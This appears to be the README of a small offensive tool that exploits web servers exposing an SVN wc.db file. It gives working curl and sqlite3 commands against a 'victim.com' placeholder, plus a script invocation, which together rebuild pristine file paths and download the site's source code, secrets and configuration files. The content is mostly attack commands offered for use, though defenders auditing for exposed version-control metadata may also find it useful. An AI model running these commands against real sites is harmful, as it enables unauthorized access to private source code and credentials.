# svn-db_downloader
Little tool to exploit exposed SVN wc.db files

The tool will download all files that are also visible in the wc.db. The may help you to get access to source code, secrets, configuration files etc.

## Getting the required data
Download the exposed wc.db file and run the following command on it:

```bash
curl -o wc.db https://victim.com/wc.db
sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;' > svn-input.txt
```

Next run the script using the resulting svn-input.txt file.

```bash
./svn-db_parser.sh --baseurl "https://victim.com" --input svn-input.txt --output report
```


